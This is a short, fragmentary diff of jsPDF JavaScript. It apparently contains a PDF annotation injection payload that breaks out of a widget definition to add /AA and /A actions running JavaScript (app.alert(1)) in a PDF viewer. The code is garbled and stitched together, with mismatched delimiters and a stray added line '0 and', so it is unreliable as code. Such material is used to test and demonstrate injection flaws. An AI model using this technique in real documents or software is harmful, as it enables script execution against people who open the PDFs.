@@ -6,6 +6,7 @@ var doc = new jsPDF();
     <</Type /Annot /Subtype /Widget /Parent<</FT/Btn/T(a)>> /Rect [0 0            900 900] /AA <</E <</S/JavaScript/JS(app.alert(1))>>/(`});
     doc.text(20, 20, 'Test');
 >>
+   0 and 
    /blah)>>/A<</S/JavaScript/JS(app.alert(1)
 <<
   /Type /Catalog
